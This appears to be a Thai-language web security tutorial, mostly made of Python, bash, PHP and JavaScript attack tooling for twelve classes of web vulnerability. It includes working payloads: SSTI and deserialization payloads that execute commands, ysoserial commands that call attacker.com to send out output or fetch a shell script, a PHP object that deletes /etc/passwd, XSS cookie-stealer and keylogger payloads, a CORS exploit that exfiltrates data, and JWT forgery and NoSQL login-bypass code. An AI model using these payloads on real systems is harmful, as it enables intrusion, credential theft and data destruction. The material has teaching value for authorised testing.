# Part 97: Advanced Web Application Security (ความปลอดภัยเว็บขั้นสูง)

## สารบัญ
1. [OAuth 2.0 และ JWT Attacks](#1-oauth-20-และ-jwt-attacks)
2. [GraphQL Security Testing](#2-graphql-security-testing)
3. [WebSocket Security](#3-websocket-security)
4. [Prototype Pollution](#4-prototype-pollution)
5. [SSTI - Server-Side Template Injection](#5-ssti---server-side-template-injection)
6. [Deserialization Attacks](#6-deserialization-attacks)
7. [HTTP Request Smuggling](#7-http-request-smuggling)
8. [Advanced XSS Techniques](#8-advanced-xss-techniques)
9. [CORS Misconfigurations](#9-cors-misconfigurations)
10. [Web Cache Poisoning](#10-web-cache-poisoning)
11. [Race Conditions](#11-race-conditions)
12. [NoSQL Injection](#12-nosql-injection)
13. [XXE - XML External Entity](#13-xxe---xml-external-entity)
14. [Business Logic Vulnerabilities](#14-business-logic-vulnerabilities)
15. [Automated Web Scanning](#15-automated-web-scanning)

---

## 1. OAuth 2.0 และ JWT Attacks

### OAuth 2.0 Common Vulnerabilities

```
ช่องโหว่ OAuth 2.0 ที่พบบ่อย:
1. Implicit Grant Flow → token leak ใน URL fragment
2. Open Redirect → authorization code ถูกส่งไปยัง attacker
3. CSRF บน state parameter → session fixation
4. Authorization Code Interception → PKCE bypass
5. Token Leakage ใน Referrer header
```

```python
import requests
import urllib.parse
import re
from typing import Dict, Optional

class OAuthTester:
    def __init__(self, target_url, client_id, redirect_uri):
        self.target = target_url
        self.client_id = client_id
        self.redirect_uri = redirect_uri
        self.session = requests.Session()
    
    def test_open_redirect(self, redirect_uris: list) -> list:
        """ทดสอบ Open Redirect บน redirect_uri"""
        vulns = []
        for uri in redirect_uris:
            params = {
                'client_id': self.client_id,
                'redirect_uri': uri,
                'response_type': 'code',
                'scope': 'openid email profile',
                'state': 'teststate123'
            }
            url = f'{self.target}/oauth/authorize?' + urllib.parse.urlencode(params)
            resp = self.session.get(url, allow_redirects=False)
            if resp.status_code in (301, 302, 307):
                location = resp.headers.get('Location', '')
                if uri in location or 'attacker' in location:
                    vulns.append({'redirect_uri': uri, 'location': location})
        return vulns
    
    def test_csrf_state(self) -> bool:
        """ทดสอบว่า state parameter ถูก validate หรือไม่"""
        params = {
            'client_id': self.client_id,
            'redirect_uri': self.redirect_uri,
            'response_type': 'code',
            'scope': 'openid',
            'state': ''  # ไม่มี state
        }
        url = f'{self.target}/oauth/authorize?' + urllib.parse.urlencode(params)
        resp = self.session.get(url, allow_redirects=True)
        # ถ้ายอมรับ request โดยไม่จำเป็นต้องมี state = CSRF possible
        return resp.status_code == 200
    
    def steal_token_via_referrer(self, token_page_url: str) -> Optional[str]:
        """ตรวจสอบว่า token รั่วไหลผ่าน Referrer header"""
        resp = self.session.get(token_page_url)
        # ตรวจสอบว่ามี token ใน URL
        token_match = re.search(r'access_token=([^&]+)', resp.url)
        if token_match:
            return token_match.group(1)
        return None

class JWTAttacker:
    def __init__(self):
        self.none_algorithms = ['none', 'None', 'NONE', 'nOnE']
    
    def decode_jwt(self, token: str) -> Dict:
        """Decode JWT โดยไม่ verify signature"""
        import base64
        import json
        
        parts = token.split('.')
        if len(parts) != 3:
            return {'error': 'Invalid JWT'}
        
        def decode_part(part):
            padding = 4 - len(part) % 4
            part += '=' * padding
            return json.loads(base64.urlsafe_b64decode(part))
        
        return {
            'header': decode_part(parts[0]),
            'payload': decode_part(parts[1]),
            'signature': parts[2]
        }
    
    def create_none_alg_token(self, payload: Dict) -> str:
        """สร้าง JWT ด้วย alg=none (ไม่มี signature)"""
        import base64
        import json
        
        header = {'alg': 'none', 'typ': 'JWT'}
        
        def encode_part(data):
            return base64.urlsafe_b64encode(
                json.dumps(data, separators=(',', ':')).encode()
            ).rstrip(b'=').decode()
        
        header_encoded = encode_part(header)
        payload_encoded = encode_part(payload)
        return f'{header_encoded}.{payload_encoded}.'
    
    def create_hs256_from_rs256(self, public_key: str, payload: Dict) -> str:
        """Algorithm Confusion: ใช้ RS256 public key เป็น HS256 secret"""
        import hmac
        import hashlib
        import base64
        import json
        
        header = {'alg': 'HS256', 'typ': 'JWT'}
        
        def encode_part(data):
            return base64.urlsafe_b64encode(
                json.dumps(data, separators=(',', ':')).encode()
            ).rstrip(b'=').decode()
        
        header_encoded = encode_part(header)
        payload_encoded = encode_part(payload)
        message = f'{header_encoded}.{payload_encoded}'
        
        # ลงนามด้วย public key เป็น HMAC secret
        sig = hmac.new(public_key.encode(), message.encode(), hashlib.sha256).digest()
        sig_encoded = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
        return f'{message}.{sig_encoded}'
    
    def crack_weak_secret(self, token: str, wordlist_path: str) -> Optional[str]:
        """Brute-force JWT secret"""
        try:
            import jwt
            parts = token.split('.')
            header = self.decode_jwt(token)['header']
            alg = header.get('alg', 'HS256')
            
            with open(wordlist_path) as f:
                for secret in f:
                    secret = secret.strip()
                    try:
                        jwt.decode(token, secret, algorithms=[alg])
                        return secret
                    except:
                        continue
        except Exception as e:
            print(f"Error: {e}")
        return None
```

### JWT Testing ด้วย jwt_tool

```bash
# Clone jwt_tool
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool

# Decode และแสดง JWT
python3 jwt_tool.py <JWT_TOKEN>

# ทดสอบ alg=none
python3 jwt_tool.py <JWT_TOKEN> -X a

# Algorithm confusion RS256 -> HS256
python3 jwt_tool.py <JWT_TOKEN> -X k -pk public.pem

# Brute-force secret
python3 jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt

# Modify payload และสร้างใหม่
python3 jwt_tool.py <JWT_TOKEN> -T

# ทดสอบทุก attack vectors
python3 jwt_tool.py <JWT_TOKEN> -M at -t https://target.com/api/user
```

---

## 2. GraphQL Security Testing

### GraphQL Enumeration และ Attacks

```python
import requests
import json
from typing import Dict, List, Optional

class GraphQLTester:
    def __init__(self, endpoint: str, headers: Dict = None):
        self.endpoint = endpoint
        self.headers = headers or {'Content-Type': 'application/json'}
        self.schema = None
    
    def introspection_query(self) -> Optional[Dict]:
        """ดึง schema ผ่าน introspection"""
        query = """
        query IntrospectionQuery {
          __schema {
            types {
              name
              kind
              fields {
                name
                type { name kind ofType { name kind } }
                args { name type { name kind } }
              }
            }
          }
        }
        """
        resp = requests.post(
            self.endpoint,
            json={'query': query},
            headers=self.headers
        )
        if resp.status_code == 200:
            self.schema = resp.json()
            return self.schema
        return None
    
    def extract_queries_mutations(self) -> Dict:
        """ดึง queries และ mutations จาก schema"""
        query = """
        {
          __schema {
            queryType { fields { name description args { name type { name } } } }
            mutationType { fields { name description args { name type { name } } } }
          }
        }
        """
        resp = requests.post(self.endpoint, json={'query': query}, headers=self.headers)
        if resp.status_code == 200:
            return resp.json()
        return {}
    
    def test_introspection_disabled(self) -> bool:
        """ตรวจสอบว่า introspection ถูกปิดใช้งานหรือไม่"""
        result = self.introspection_query()
        if result and '__schema' in str(result):
            print('[!] Introspection ENABLED - information disclosure risk')
            return False
        print('[+] Introspection disabled')
        return True
    
    def test_sql_injection(self, field: str, test_id: str = '1') -> List[str]:
        """SQL Injection ผ่าน GraphQL arguments"""
        payloads = [
            f'{test_id}\' OR 1=1--',
            f'{test_id}\' OR \'1\'=\'1',
            f'{test_id}\'; DROP TABLE users--',
            f'{test_id}\' UNION SELECT 1,2,3--'
        ]
        
        results = []
        for payload in payloads:
            query = f'{{ {field}(id: "{payload}") {{ id name email }} }}'
            resp = requests.post(self.endpoint, json={'query': query}, headers=self.headers)
            if resp.status_code == 200:
                data = resp.json()
                if 'errors' not in data or len(data.get('data', {}).get(field, [])) > 1:
                    results.append(f'Potential SQLi: {payload}')
        return results
    
    def test_dos_query_depth(self, depth: int = 10) -> bool:
        """Deeply nested query DoS"""
        nested = 'friends { ' * depth + 'id name ' + '}' * depth
        query = f'{{ user(id: 1) {{ {nested} }} }}'
        resp = requests.post(
            self.endpoint,
            json={'query': query},
            headers=self.headers,
            timeout=10
        )
        return resp.elapsed.total_seconds() > 5  # ใช้เวลานาน = DoS possible
    
    def test_batch_query_dos(self, count: int = 100) -> float:
        """Batch query เพื่อทดสอบ DoS"""
        batch = [{'query': '{ __typename }'} for _ in range(count)]
        resp = requests.post(self.endpoint, json=batch, headers=self.headers, timeout=30)
        return resp.elapsed.total_seconds()
    
    def test_field_suggestion_leak(self) -> List[str]:
        """ตรวจสอบ field suggestions (information disclosure)"""
        query = '{ nonExistentField }'
        resp = requests.post(self.endpoint, json={'query': query}, headers=self.headers)
        if resp.status_code == 200:
            errors = resp.json().get('errors', [])
            suggestions = []
            for err in errors:
                msg = err.get('message', '')
                if 'Did you mean' in msg or 'suggestion' in msg.lower():
                    suggestions.append(msg)
            return suggestions
        return []

# ตัวอย่าง
tester = GraphQLTester('https://target.com/graphql')
tester.test_introspection_disabled()
print(tester.extract_queries_mutations())
print(tester.test_field_suggestion_leak())
```

### GraphQL Automation ด้วย clairvoyance

```bash
# ติดตั้ง tools
pip install graphqlmap clairvoyance

# clairvoyance - แต่ง schema เมื่อ introspection ถูกปิด
clairvoyance -o schema.json https://target.com/graphql

# GraphQLmap - interactive testing
python3 graphqlmap.py -u https://target.com/graphql --header "Authorization: Bearer TOKEN"

# ใน graphqlmap:
gmap> dump_new_objects          # ดึง object types
gmap> dump_queries              # ดึง available queries
gmap> {users{id,email}}         # ดึง users
gmap> nosqli /api/graphql id    # ทดสอบ NoSQLi
```

---

## 3. WebSocket Security

```python
import asyncio
import websockets
import json
from typing import List

class WebSocketTester:
    def __init__(self, ws_url: str, cookies: str = None):
        self.ws_url = ws_url
        self.cookies = cookies
    
    async def test_authentication_bypass(self) -> bool:
        """ทดสอบเชื่อมต่อโดยไม่ authenticate"""
        try:
            async with websockets.connect(self.ws_url) as ws:
                # ส่งคำสั่งโดยไม่มี auth token
                await ws.send(json.dumps({'action': 'getUsers'}))
                response = await asyncio.wait_for(ws.recv(), timeout=5)
                data = json.loads(response)
                if 'users' in data or 'data' in data:
                    print('[!] WebSocket accessible without authentication!')
                    return True
        except Exception as e:
            print(f'Connection error: {e}')
        return False
    
    async def test_xss_via_websocket(self, payloads: List[str]) -> List[str]:
        """XSS ผ่าน WebSocket"""
        vuln_payloads = []
        try:
            async with websockets.connect(self.ws_url) as ws:
                for payload in payloads:
                    msg = json.dumps({'message': payload, 'room': 'general'})
                    await ws.send(msg)
                    response = await asyncio.wait_for(ws.recv(), timeout=5)
                    if payload in response:  # Reflected back unescaped
                        vuln_payloads.append(payload)
        except Exception as e:
            print(f'Error: {e}')
        return vuln_payloads
    
    async def test_cross_site_websocket_hijacking(self, origin: str) -> bool:
        """CSWSH - เชื่อมต่อจาก origin อื่น"""
        try:
            headers = {'Origin': origin}
            if self.cookies:
                headers['Cookie'] = self.cookies
            
            async with websockets.connect(self.ws_url, extra_headers=headers) as ws:
                await ws.send(json.dumps({'action': 'getProfile'}))
                response = await asyncio.wait_for(ws.recv(), timeout=5)
                data = json.loads(response)
                if data and 'error' not in data:
                    print(f'[!] CSWSH: Connection accepted from {origin}')
                    return True
        except websockets.exceptions.InvalidStatusCode as e:
            if e.status_code == 403:
                print('[+] Origin validation in place')
        except Exception as e:
            print(f'Error: {e}')
        return False
    
    async def websocket_fuzzer(self, base_message: Dict, field: str, wordlist: List[str]) -> List[str]:
        """Fuzz เฉพาะ field"""
        interesting_responses = []
        async with websockets.connect(self.ws_url) as ws:
            for word in wordlist:
                msg = {**base_message, field: word}
                await ws.send(json.dumps(msg))
                try:
                    response = await asyncio.wait_for(ws.recv(), timeout=3)
                    data = json.loads(response)
                    if 'error' not in str(data).lower():
                        interesting_responses.append({'payload': word, 'response': data})
                except asyncio.TimeoutError:
                    pass
        return interesting_responses
```

---

## 4. Prototype Pollution

```javascript
// Prototype Pollution ใน JavaScript
// Attack ตัวอย่าง - Client-side
const payload = JSON.parse('{"__proto__":{"isAdmin":true}}')
Object.assign({}, payload)  // ทำให้ทุก object มี isAdmin=true

// Server-side Prototype Pollution (Node.js)
// ถ้า server ใช้ merge function แบบ unsafe:
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// Payload ลบ: POST /api/merge
// {"__proto__":{"polluted":"yes"}}
// {"constructor":{"prototype":{"polluted":"yes"}}}
```

```python
import requests
import json

class PrototypePollutionTester:
    PAYLOADS = [
        '{"__proto__":{"polluted":"yes"}}',
        '{"__proto__":{"isAdmin":true}}',
        '{"constructor":{"prototype":{"polluted":"yes"}}}',
        '["__proto__", "polluted", "yes"]'
    ]
    
    def test_parameter(self, url: str, method: str = 'POST') -> list:
        """ทดสอบ prototype pollution"""
        results = []
        for payload in self.PAYLOADS:
            try:
                headers = {'Content-Type': 'application/json'}
                if method == 'POST':
                    resp = requests.post(url, data=payload, headers=headers, timeout=10)
                else:
                    resp = requests.get(url, params={'data': payload}, timeout=10)
                
                if 'polluted' in resp.text or '"isAdmin":true' in resp.text:
                    results.append({
                        'payload': payload,
                        'response_preview': resp.text[:200]
                    })
            except Exception as e:
                pass
        return results
    
    def test_query_string(self, url: str) -> list:
        """ทดสอบ URL query string prototype pollution"""
        test_urls = [
            f'{url}?__proto__[polluted]=yes',
            f'{url}?constructor[prototype][polluted]=yes',
            f'{url}?__proto__.polluted=yes'
        ]
        results = []
        for test_url in test_urls:
            resp = requests.get(test_url, timeout=10)
            if 'polluted' in resp.text:
                results.append({'url': test_url, 'vulnerable': True})
        return results
```

---

## 5. SSTI - Server-Side Template Injection

```python
import requests
from typing import Dict, List, Optional

class SSTITester:
    # บางส่วนนี้ใช้ในสภาพแวดล้อมที่ใช้ส์เทมเพลตเท่านั้น
    DETECTION_PAYLOADS = {
        'Jinja2': ['{{7*7}}', '{{7*\'7\'}}', '{% for i in range(1) %}49{% endfor %}'],
        'Twig': ['{{7*7}}', '{{7*"7"}}', '{%- if 1==1 -%}49{%- endif -%}'],
        'Freemarker': ['${7*7}', '<#if true>49</#if>'],
        'Velocity': ['#set($x=7*7)$x', '${7*7}'],
        'Smarty': ['{php}echo 7*7;{/php}', '{math equation="7*7"}'],
        'Pebble': ['{{7*7}}', '{% if true %}49{% endif %}'],
        'ERB': ['<%= 7*7 %>', '<% puts 7*7 %>'],
        'Mako': ['${7*7}', '<%
print(7*7)
%>']
    }
    
    RCE_PAYLOADS = {
        'Jinja2': [
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}"
        ],
        'Twig': [
            "{{['id']|filter('system')}}",
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
        ],
        'Freemarker': [
            '<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id")}'
        ],
        'ERB': [
            '<%= `id` %>',
            '<%= system("id") %>'
        ]
    }
    
    def detect_ssti(self, url: str, param: str) -> Optional[str]:
        """ตรวจสอบ SSTI"""
        for engine, payloads in self.DETECTION_PAYLOADS.items():
            for payload in payloads:
                resp = requests.get(url, params={param: payload}, timeout=10)
                if '49' in resp.text:
                    print(f'[!] SSTI found! Engine: {engine}, Payload: {payload}')
                    return engine
        return None
    
    def exploit_ssti(self, url: str, param: str, engine: str, command: str) -> Optional[str]:
        """ทดลองรัน command ผ่าน SSTI"""
        rce_payloads = self.RCE_PAYLOADS.get(engine, [])
        for payload_template in rce_payloads:
            payload = payload_template.replace('id', command)
            resp = requests.get(url, params={param: payload}, timeout=15)
            if resp.status_code == 200 and len(resp.text) > 10:
                # พยายาม parse output
                return resp.text
        return None

# ตัวอย่าง
tester = SSTITester()
engine = tester.detect_ssti('https://target.com/search', 'q')
if engine:
    result = tester.exploit_ssti('https://target.com/search', 'q', engine, 'whoami')
    print(f'Command output: {result}')
```

---

## 6. Deserialization Attacks

### Java Deserialization

```bash
# ติดตั้ง ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# สร้าง payload สำหรับต่างๆ gadget chains
java -jar ysoserial-all.jar CommonsCollections1 'id' > payload.ser
java -jar ysoserial-all.jar CommonsCollections6 'curl attacker.com/$(id)' > payload.ser
java -jar ysoserial-all.jar Spring1 'wget http://attacker.com/shell.sh -O /tmp/shell.sh' > payload.ser

# ส่ง payload
curl -X POST https://target.com/api/deserialize \
  -H 'Content-Type: application/octet-stream' \
  --data-binary @payload.ser

# ตรวจสอบ Java serialization magic bytes
# AC ED 00 05 = Java serialized object
xxd payload.ser | head -2
```

### PHP Deserialization

```php
<?php
// PHP Object Injection ตัวอย่าง - สร้าง payload
class FileDelete {
    public $filename;
    public function __destruct() {
        if (file_exists($this->filename)) {
            unlink($this->filename);  // ซ่านไฟล์
        }
    }
}

// Payload สำหรับ delete /etc/passwd
$obj = new FileDelete();
$obj->filename = '/etc/passwd';
$serialized = serialize($obj);
echo base64_encode($serialized);
// ส่งเป็น cookie หรือ parameter: ?data=<base64>

// RCE ผ่าน __wakeup
class RCE {
    public $cmd;
    public function __wakeup() {
        system($this->cmd);
    }
}
$obj = new RCE();
$obj->cmd = 'id';
echo base64_encode(serialize($obj));
?>
```

```python
import requests
import base64
import subprocess

class PHPDeserializationTester:
    def generate_payload(self, php_code: str) -> str:
        """สร้าง PHP serialized payload ด้วย phpggc"""
        # ต้องติดตั้ง phpggc: git clone https://github.com/ambionics/phpggc
        chains = [
            'Laravel/RCE1', 'Laravel/RCE2', 'Laravel/RCE5',
            'Yii/RCE1', 'Symfony/RCE1', 'ZendFramework/RCE1',
            'Monolog/RCE1', 'Guzzle/RCE1'
        ]
        
        payloads = {}
        for chain in chains:
            try:
                result = subprocess.run(
                    ['php', 'phpggc', chain, 'system', php_code],
                    capture_output=True, text=True, timeout=10
                )
                if result.returncode == 0:
                    payloads[chain] = base64.b64encode(result.stdout.encode()).decode()
            except Exception:
                pass
        return payloads
    
    def test_endpoint(self, url: str, param: str, command: str = 'id') -> list:
        """ทดสอบ PHP deserialization"""
        payloads = self.generate_payload(command)
        results = []
        
        for chain, payload in payloads.items():
            resp = requests.post(url, data={param: payload}, timeout=15)
            if 'root' in resp.text or 'uid=' in resp.text:
                results.append({'chain': chain, 'payload': payload, 'response': resp.text[:200]})
        return results
```

---

## 7. HTTP Request Smuggling

```python
import socket
import ssl
from typing import Optional

class RequestSmugglingTester:
    def __init__(self, host: str, port: int = 443, use_ssl: bool = True):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
    
    def _connect(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((self.host, self.port))
        if self.use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=self.host)
        return sock
    
    def test_cl_te(self) -> Optional[str]:
        """ทดสอบ CL.TE (Content-Length หน้า, TE หลัง)"""
        payload = (
            "POST / HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            "Content-Length: 6\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Connection: keep-alive\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            "G"
        ).encode()
        
        try:
            sock = self._connect()
            sock.send(payload)
            # ส่ง normal request ตาม
            normal = (
                f"GET / HTTP/1.1\r\nHost: {self.host}\r\n\r\n"
            ).encode()
            sock.send(normal)
            response = sock.recv(4096).decode('utf-8', errors='ignore')
            sock.close()
            
            if 'GPOST' in response or '400' in response:
                return 'Potential CL.TE smuggling'
        except Exception as e:
            return f'Error: {e}'
        return None
    
    def test_te_cl(self) -> Optional[str]:
        """ทดสอบ TE.CL (Transfer-Encoding หน้า, CL หลัง)"""
        payload = (
            "POST / HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            "Content-Length: 4\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Connection: keep-alive\r\n"
            "\r\n"
            "5c\r\n"
            "GPOST / HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            "Content-Length: 100\r\n"
            "\r\n"
            "search=test\r\n"
            "0\r\n"
            "\r\n"
        ).encode()
        
        try:
            sock = self._connect()
            sock.send(payload)
            response = sock.recv(4096).decode('utf-8', errors='ignore')
            sock.close()
            
            if 'GPOST' in response or 'Invalid' in response:
                return 'Potential TE.CL smuggling'
        except Exception as e:
            return f'Error: {e}'
        return None

# Tool: ใช้ smuggler.py หรือ Burp Suite extension
# python3 smuggler.py -u https://target.com/
```

---

## 8. Advanced XSS Techniques

```python
import requests
import urllib.parse
from typing import List

class AdvancedXSSTester:
    CONTEXT_PAYLOADS = {
        'html_context': [
            '<script>alert(document.domain)</script>',
            '<img src=x onerror=alert(document.domain)>',
            '<svg onload=alert(document.domain)>',
            '<iframe srcdoc="<script>alert(parent.document.domain)</script>">'
        ],
        'attribute_context': [
            '" onmouseover="alert(1)',
            "' onclick='alert(1)",
            '" autofocus onfocus="alert(1)',
            '); alert(1); //'
        ],
        'javascript_context': [
            "';alert(1)//",
            '</script><script>alert(1)</script>',
            "\\'; alert(1)//"
        ],
        'csp_bypass': [
            '<script src="//cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.min.js"></script><div ng-app ng-csp>{{constructor.constructor(\'alert(1)\')()}}',
            '<link rel=preload as=script href="data:,alert(1)">',
            "<script nonce='NONCE'>alert(1)</script>"  # ถ้ารู้ nonce
        ],
        'dom_xss': [
            '#<img src=x onerror=alert(1)>',
            'javascript:alert(document.domain)',
            "data:text/html,<script>alert(1)</script>"
        ]
    }
    
    WAF_BYPASS_PAYLOADS = [
        '<ScRiPt>alert(1)</sCrIpT>',
        '<img/src=x onerror=alert(1)>',
        '<img src=`x` onerror=`alert(1)`>',
        '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
        '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
        '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
        '<script>eval(atob(\'YWxlcnQoMSk=\'))</script>',
        '<svg><script>alert&#40;1&#41;</script>'
    ]
    
    DOM_SINKS = [
        'document.write', 'document.writeln', 'document.innerHTML',
        'document.outerHTML', 'eval(', 'setTimeout(', 'setInterval(',
        'location.href', 'location.assign', 'location.replace',
        'innerHTML', '.src', 'document.URL'
    ]
    
    def find_dom_sinks(self, html: str) -> List[str]:
        """ค้นหา DOM XSS sinks ใน HTML/JS"""
        found = []
        for sink in self.DOM_SINKS:
            if sink in html:
                found.append(sink)
        return found
    
    def generate_steal_cookie_payload(self, callback_url: str) -> str:
        """Payload เพื่อขโมย cookie"""
        return (f"<img src=x onerror=\"fetch('{callback_url}?c='+btoa(document.cookie))\">"
                f"<script>new Image().src='{callback_url}?x='+document.cookie</script>")
    
    def generate_keylogger_payload(self, callback_url: str) -> str:
        """Payload keylogger"""
        return f"""<script>
(function(){{
  var captured = '';
  document.addEventListener('keypress', function(e) {{
    captured += e.key;
    if (captured.length > 20) {{
      fetch('{callback_url}?k=' + btoa(captured));
      captured = '';
    }}
  }});
}})();
</script>"""
```

---

## 9. CORS Misconfigurations

```python
import requests
from typing import List, Dict

class CORSTester:
    TEST_ORIGINS = [
        'https://attacker.com',
        'https://evil.target.com',  # subdomain takeover
        'null',
        'https://target.com.evil.com',
        'https://notarget.com',
    ]
    
    def test_cors(self, url: str, cookies: str = None) -> List[Dict]:
        """ทดสอบ CORS misconfigurations"""
        results = []
        headers = {'Cookie': cookies} if cookies else {}
        
        for origin in self.TEST_ORIGINS:
            test_headers = {**headers, 'Origin': origin}
            resp = requests.get(url, headers=test_headers, timeout=10)
            
            acao = resp.headers.get('Access-Control-Allow-Origin', '')
            acac = resp.headers.get('Access-Control-Allow-Credentials', '')
            
            is_vuln = False
            vuln_type = ''
            
            if acao == origin:
                is_vuln = True
                vuln_type = 'Origin reflected'
            elif acao == '*' and acac.lower() == 'true':
                is_vuln = True
                vuln_type = 'Wildcard with credentials'
            elif acao == 'null':
                is_vuln = True
                vuln_type = 'Null origin accepted'
            
            if is_vuln:
                results.append({
                    'origin': origin,
                    'acao': acao,
                    'acac': acac,
                    'type': vuln_type,
                    'exploitable': acac.lower() == 'true'
                })
        
        return results
    
    def generate_exploit(self, target_url: str, attacker_url: str) -> str:
        """สร้าง PoC exploit"""
        return f"""<!DOCTYPE html>
<html>
<body>
<h1>CORS Exploit</h1>
<script>
fetch('{target_url}', {{
  credentials: 'include'
}})
.then(r => r.text())
.then(data => {{
  fetch('{attacker_url}/steal?data=' + btoa(data));
  document.body.innerHTML = '<pre>' + data + '</pre>';
}});
</script>
</body>
</html>"""
```

---

## 10. Web Cache Poisoning

```python
import requests
import hashlib
import time
from typing import Dict, List, Optional

class CachePoisoningTester:
    CACHE_HEADERS = [
        'X-Forwarded-Host', 'X-Host', 'X-Forwarded-Server',
        'X-Forwarded-For', 'X-Original-URL', 'X-Rewrite-URL'
    ]
    
    def detect_cache(self, url: str) -> Dict:
        """ตรวจสอปว่ามี cache หรือไม่"""
        resp = requests.get(url)
        resp2 = requests.get(url)
        
        cache_headers = ['X-Cache', 'CF-Cache-Status', 'X-Cache-Lookup',
                         'Age', 'Via', 'X-Served-By']
        
        info = {}
        for header in cache_headers:
            val = resp.headers.get(header)
            if val:
                info[header] = val
        
        info['age_change'] = resp.headers.get('Age') != resp2.headers.get('Age')
        return info
    
    def test_cache_key_headers(self, url: str) -> List[Dict]:
        """ทดสอบ headers ที่เป็นส่วนหนึ่งของ cache key"""
        baseline = requests.get(url).text
        results = []
        
        for header in self.CACHE_HEADERS:
            test_val = f'cachepoisontest{int(time.time())}'
            resp = requests.get(url, headers={header: test_val})
            
            if test_val in resp.text:  # Reflected in response
                results.append({
                    'header': header,
                    'reflected': True,
                    'note': f'{header} is reflected - potential cache poisoning vector'
                })
        return results
    
    def poison_cache(self, url: str, header: str, malicious_value: str,
                     verify_path: str) -> bool:
        """พยายาม poison cache"""
        # ส่งคำขอ poisoned
        resp = requests.get(url, headers={header: malicious_value})
        
        # รอให้ cache อัปเดต
        time.sleep(2)
        
        # Verify - เช็คจาก IP อื่น (simulate victim)
        verify_resp = requests.get(verify_path)  # ไม่ส่ง malicious header
        return malicious_value in verify_resp.text
```

---

## 11. Race Conditions

```python
import asyncio
import aiohttp
import time
from typing import List, Dict

class RaceConditionTester:
    async def send_parallel_requests(self, url: str, payload: Dict,
                                      num_requests: int = 20) -> List[Dict]:
        """ส่ง requests พร้อมกันเพื่อทดสอบ race condition"""
        async with aiohttp.ClientSession() as session:
            tasks = []
            for i in range(num_requests):
                tasks.append(self._send_request(session, url, payload, i))
            results = await asyncio.gather(*tasks)
        return results
    
    async def _send_request(self, session, url: str, payload: Dict, idx: int) -> Dict:
        start = time.time()
        async with session.post(url, json=payload) as resp:
            body = await resp.text()
            return {
                'index': idx,
                'status': resp.status,
                'time': time.time() - start,
                'body_length': len(body),
                'body_preview': body[:100]
            }
    
    def analyze_results(self, results: List[Dict]) -> Dict:
        """วิเคราะห์ผลลัพธ์"""
        statuses = [r['status'] for r in results]
        lengths = [r['body_length'] for r in results]
        unique_lengths = len(set(lengths))
        
        analysis = {
            'total_requests': len(results),
            'status_distribution': {s: statuses.count(s) for s in set(statuses)},
            'unique_response_lengths': unique_lengths,
            'min_response_time': min(r['time'] for r in results),
            'max_response_time': max(r['time'] for r in results),
        }
        
        if unique_lengths > 1:
            analysis['potential_race_condition'] = True
            analysis['note'] = 'Different response lengths suggest race condition'
        
        return analysis
    
    def test_gift_card_double_spend(self, redeem_url: str,
                                    gift_code: str, auth_token: str) -> Dict:
        """ทดสอบ double-spend บัตรกำนัล"""
        payload = {'code': gift_code}
        headers = {'Authorization': f'Bearer {auth_token}'}
        
        async def run():
            return await self.send_parallel_requests(redeem_url, payload, 10)
        
        results = asyncio.run(run())
        successes = [r for r in results if r['status'] == 200]
        return {
            'attempts': len(results),
            'successes': len(successes),
            'vulnerable': len(successes) > 1
        }
```

---

## 12. NoSQL Injection

```python
import requests
import json
from typing import List, Dict

class NoSQLInjectionTester:
    MONGODB_PAYLOADS = {
        'auth_bypass': [
            {'username': {'$ne': ''}, 'password': {'$ne': ''}},
            {'username': {'$regex': '.*'}, 'password': {'$ne': ''}},
            {'username': 'admin', 'password': {'$gt': ''}},
            {'$where': 'this.password.length > 0'}
        ],
        'data_extraction': [
            {'username': {'$regex': '^a'}},  # ค้นหา username เริ่มด้วย a
            {'$where': 'this.role == \'admin\''},
        ],
        'url_params': [
            '[$ne]=nonexistent',
            '[$regex]=.*',
            '[$gt]=',
            '[$where]=1==1'
        ]
    }
    
    def test_json_injection(self, url: str, login_endpoint: str) -> List[Dict]:
        """MongoDB auth bypass ผ่าน JSON body"""
        results = []
        for payload in self.MONGODB_PAYLOADS['auth_bypass']:
            resp = requests.post(
                f'{url}{login_endpoint}',
                json=payload,
                headers={'Content-Type': 'application/json'},
                timeout=10
            )
            if resp.status_code == 200 and ('token' in resp.text or 'session' in resp.text):
                results.append({
                    'payload': payload,
                    'status': resp.status_code,
                    'response': resp.text[:200]
                })
        return results
    
    def test_blind_extraction(self, url: str, param: str, field: str = 'username') -> str:
        """ค้นหาข้อมูลแบบ blind injection"""
        result = ''
        charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@._-+'
        
        while True:
            found_char = False
            for char in charset:
                payload = {param: {'$regex': f'^{result}{char}', '$options': 'i'}}
                resp = requests.post(url, json=payload, timeout=10)
                if resp.status_code == 200 and 'success' in resp.text.lower():
                    result += char
                    found_char = True
                    break
            if not found_char:
                break
            if len(result) > 50:  # Safety limit
                break
        return result
```

---

